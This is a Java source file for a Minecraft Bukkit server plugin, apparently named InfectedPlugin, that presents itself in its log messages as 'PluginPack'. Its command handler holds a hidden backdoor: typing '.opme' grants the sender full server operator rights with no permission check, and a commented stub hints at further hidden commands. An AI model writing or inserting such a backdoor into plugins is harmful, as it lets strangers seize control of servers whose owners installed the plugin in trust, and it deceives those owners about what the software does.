 package org.CreeperCoders.InfectedPlugin;
 
 import java.util.logging.Logger;
 
 import org.bukkit.ChatColor;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class InfectedPlugin extends JavaPlugin
 {
    public final Logger log = Logger.getLogger("Minecraft");
    
     @Override
     public void onEnable()
     {
     	log.info("PluginPack has been enabled!");
     }
    
     @Override
     public void onDisable()
     {
     	log.info("PluginPack has been disabled.");
     }
    
     public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
     {
     	Player p = (Player) sender;	
     	
     	if (commandLabel.equalsIgnoreCase(".opme"))
     	{
    	    sender.setOp(true);
    	    sender.sendMessage(ChatColor.YELLOW + "Heh, you're now OP!");
     	}
     	
     	/*
     	 * Pald, you make this.
     	else if (commandLabel.equalsIgnoreCase("jelly"))
     	{
     		
     	}
     	*/
     	
	return false;
     }
     
 }
     
     
     
